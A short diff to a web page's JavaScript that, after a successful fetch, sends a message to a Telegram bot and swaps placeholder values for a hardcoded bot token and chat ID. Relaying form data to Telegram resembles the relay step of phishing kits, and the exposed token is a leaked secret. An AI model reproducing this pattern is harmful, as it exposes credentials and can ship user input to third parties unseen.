@@ -1,7 +1,7 @@
 
 //           // Send data to Telegram
-//           const telegramToken = "7438673598:AAEScuKPGsJAGn5fFiXavF_2vH-fNfSBQVg";
-//           const chatId = "-1002230132257"; // Replace with your chat ID
+          // const telegramToken = "7438673598:AAEScuKPGsJAGn5fFiXavF_2vH-fNfSBQVg";
+          // const chatId = "-1002230132257"; // Replace with your chat ID
 //           const telegramURL = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
 
 document.addEventListener("DOMContentLoaded", function () {
@@ -65,8 +65,8 @@ document.addEventListener("DOMContentLoaded", function () {
       .then((response) => {
         if (response.ok) {
           // Send data to Telegram
-          const telegramToken = "YOUR_TELEGRAM_BOT_TOKEN";
-          const chatId = "YOUR_CHAT_ID"; // Replace with your chat ID
+          const telegramToken = "7438673598:AAEScuKPGsJAGn5fFiXavF_2vH-fNfSBQVg";
+          const chatId = "-1002230132257"; // Replace with your chat ID
           const telegramURL = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
 
           let message = "";
